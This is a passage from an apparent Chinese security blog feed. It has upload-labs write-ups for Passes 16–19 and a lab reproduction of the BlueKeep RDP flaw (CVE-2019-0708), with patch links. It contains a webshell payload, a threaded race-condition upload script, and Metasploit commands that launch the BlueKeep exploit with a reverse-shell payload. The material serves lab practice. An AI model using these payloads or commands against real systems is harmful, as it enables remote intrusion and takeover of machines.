== <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 判断了后缀名、content-type，以及利用<code>imagecreatefromgif</code>判断是否为<code>gif</code>图片，最后再做了一次二次渲染。程序没有对渲染异常进行处理，直接在正常<code>png</code>图片内插入<code>webshell</code>代码，然后上传 </p><p>详细版参考：<a href="https://github.com/LandGrey/upload-labs-writeup" rel="external nofollow" target="_blank">Pass-16</a></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 本关考察的是条件竞争 </p><p>这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问<code>webshel</code>。<br>首先在burp中不断发送上传<code>webshell</code>的数据包,不断访问上传后的文件名</p><p>python脚本</p><p> 使用命令<code>pip install hackhttp</code>安装<a href="https://github.com/BugScanTeam/hackhttp" rel="external nofollow" target="_blank">hackhttp</a>模块 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># Build By LandGrey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(lists)</span>:</span></span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = <span class="string">"""POST /upload-labs/Pass-17/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://127.0.0.1/upload-labs/Pass-17/index.php</span></span><br><span class="line"><span class="string">Cookie: pass=17</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Length: 341</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="upload_file"; filename="17.php"</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php assert($_POST["LandGrey"])?&gt;</span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">上传</span></span><br><span class="line"><span class="string">-----------------------------6696274297634--</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    code, head, html, redirect, log = hh.http(<span class="string">'http://127.0.0.1/upload-labs/Pass-17/index.php'</span>, raw=raw)</span><br><span class="line">    print(str(code) + <span class="string">"\r"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">10</span>)</span><br><span class="line">pool.map(upload, range(<span class="number">10000</span>))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</span><br><span class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">( $dir )</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>参考：<a href="https://xz.aliyun.com/t/2435#toc-15" rel="external nofollow" target="_blank">先知社区writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload-labs </tag>
            
            <tag> web安全 </tag>
            
            <tag> 上传漏洞 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-0708复现</title>
      <link href="/ea3aa7d2.html"/>
      <url>/ea3aa7d2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019090803.jpg" alt=""><br><a id="more"></a></p><hr><h1 id="CVE-2019-0708复现"><a href="#CVE-2019-0708复现" class="headerlink" title="CVE-2019-0708复现"></a>CVE-2019-0708复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。</p><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ul><li><strong>Windows 8和Windows 10及之后版本的用户不受此漏洞影响。</strong></li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><ul><li><p>安装msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  ./msfinstall</span><br></pre></td></tr></table></figure></li><li><p>更新msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure></li></ul><p>ps:如果重装的<code>msf</code>.可能会遇到<code>gem库</code>的问题，遇到<code>pcaprb</code>无法安装的时候<br>输入<code>sudo apt-get install libpcap-dev</code><br>然后继续<code>bundle install</code></p><h3 id="替换文件"><a href="#替换文件" class="headerlink" title="替换文件"></a>替换文件</h3><p>执行以下命令，如果报没有文件夹错误，请<code>mkdir</code>创建文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line"></span><br><span class="line">cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure></p><p>网上有将文件放置<code>usr</code>目录下的教程，我出现不能调用模块的问题了，所以参考了放置<code>opt</code>目录解决了问题</p><h3 id="重置数据库"><a href="#重置数据库" class="headerlink" title="重置数据库"></a>重置数据库</h3><p>命令如下</p><blockquote><p> msfdb reinit </p></blockquote><h2 id="参数含义"><a href="#参数含义" class="headerlink" title="参数含义"></a>参数含义</h2><p>target参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)</span><br><span class="line">  2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox)</span><br><span class="line">  3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)</span><br><span class="line">  4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)</span><br></pre></td></tr></table></figure></p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>靶机<code>win7 x64</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set lhost 192.168.233.130</span><br><span class="line">lhost =&gt; 192.168.233.130</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.233.128</span><br><span class="line">rhosts =&gt; 192.168.233.128</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line">target =&gt; 3</span><br><span class="line">msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit</span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>目前公开的利用代码可用于攻击<code>Windows 7 SP1 x64</code>与 <code>Windows 2008 R2 x64</code>，该EXP并不稳定，针对 <code>Windows 7 SP1 x64</code>攻击有可能导致蓝屏。并且<code>Windows2008 R2 x64</code>需要修改<code>[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\rdpwd\fDisableCam]</code>值修改为<code>0</code>才能攻击成功。实验时记得关闭防火墙，不然会出现下面情况</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019090802.jpg" alt=""></p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>拿到靶机权限</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019090801.jpg" alt=""></p><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><a href="https://yunpan.360.cn/surl_yLFKiSgzK2D" rel="external nofollow" target="_blank">360网盘</a> （提取码：68c8）</p><p>官方源：</p><table><thead><tr><th>操作系统版本</th><th>补丁下载链接</th></tr></thead><tbody><tr><td>Windows 7 x86</td><td><a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a></td></tr><tr><td>Windows 7 x64</td><td><a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a></td></tr><tr><td>Windows Embedded Standard 7 for x64</td><td><a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a></td></tr><tr><td>Windows Embedded Standard 7 for x86</td><td><a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a></td></tr><tr><td>Windows Server 2008 x64</td><td><a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu</a></td></tr><tr><td>Windows Server 2008 Itanium</td><td><a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu" rel="external nofollow" target="_blank">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu</a></td></tr><tr><td>Windows Server 2008 